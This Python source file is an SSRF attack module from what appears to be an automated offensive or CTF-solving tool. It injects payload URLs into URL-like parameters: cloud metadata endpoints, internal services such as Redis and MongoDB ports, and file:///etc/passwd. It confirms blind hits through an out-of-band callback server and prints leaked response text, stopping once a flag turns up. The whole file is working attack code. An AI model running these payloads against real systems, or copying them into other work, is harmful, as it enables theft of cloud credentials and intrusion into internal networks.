"""
SSRF attack module.
Uses OOB server for blind detection.
Also tries direct access to cloud metadata and internal services.
"""
from __future__ import annotations
from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console
import asyncio

console = Console()

CLOUD_METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
]

INTERNAL_SERVICES = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://localhost:8080/",
    "http://localhost:3000/",
    "http://localhost:6379/",
    "http://localhost:27017/",
    "http://[::1]/",
    "dict://localhost:6379/info",
    "file:///etc/passwd",
]

SSRF_PARAM_HINTS = ["url", "uri", "path", "src", "source", "target", "fetch",
                    "redirect", "callback", "webhook", "import", "load", "image",
                    "avatar", "link", "host", "endpoint", "proxy", "next", "goto"]


class SSRFAttack(BaseAttack):
    name = "ssrf"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param", "")
        method = attack_point.get("method", "GET")

        if param and not any(hint in param.lower() for hint in SSRF_PARAM_HINTS):
            return []

        console.print(f"  [cyan][SSRF][/cyan] {method} {url} ?{param}")
        all_findings = []

        if self.oob:
            token = self.oob.generate_token("ssrf")
            oob_payload = f"{self.oob.public_url}/{token}"
            await self._try_payload(method, url, param, oob_payload)
            await asyncio.sleep(1.5)
            if self.oob.was_triggered(token):
                info = self.oob.get_hit_info(token)
                console.print(
                    f"  [bold red][SSRF][/bold red] OOB hit confirmed! "
                    f"Source IP: {info.get('source_ip')}"
                )
                all_findings.append({
                    "type": "ssrf_blind_oob",
                    "value": f"Blind SSRF @ {url} param={param} (OOB callback from {info.get('source_ip')})",
                    "confidence": 0.95,
                })

        for metadata_url in CLOUD_METADATA_URLS:
            if self._should_stop():
                break
            response, findings = await self._try_payload(method, url, param, metadata_url)
            if response and len(response.text) > 20:
                if any(hint in response.text.lower() for hint in ["ami-id", "instance", "metadata", "project"]):
                    console.print(f"  [bold red][SSRF][/bold red] Cloud metadata accessible! {metadata_url}")
                    findings.append({
                        "type": "ssrf_cloud_metadata",
                        "value": f"Cloud metadata @ {metadata_url}: {response.text[:200]}",
                        "confidence": 0.95,
                    })
                all_findings.extend(findings)
                flag = has_definite_flag(findings)
                if flag:
                    console.print(f"  [bold green][SSRF][/bold green] FLAG: {flag}")
                    self.stop_event.set()
                    return all_findings

        for internal_url in INTERNAL_SERVICES:
            if self._should_stop():
                break
            response, findings = await self._try_payload(method, url, param, internal_url)
            if response and len(response.text) > 20:
                console.print(f"  [yellow][SSRF][/yellow] Internal service response: {internal_url}")
                findings.append({
                    "type": "ssrf_internal_service",
                    "value": f"Internal SSRF @ {internal_url}: {response.text[:200]}",
                    "confidence": 0.8,
                })
                all_findings.extend(findings)

        # Skills/file payloads (gopher://, dict://, file://, custom targets)
        extra_urls = [p for p in payloads if p.startswith(("http", "gopher", "dict", "file", "ftp"))]
        for extra_url in extra_urls:
            if self._should_stop():
                break
            if extra_url in CLOUD_METADATA_URLS or extra_url in INTERNAL_SERVICES:
                continue
            response, findings = await self._try_payload(method, url, param, extra_url)
            if response and len(response.text) > 20:
                all_findings.extend(findings)
                flag = has_definite_flag(findings)
                if flag:
                    self.stop_event.set()
                    return all_findings

        return all_findings
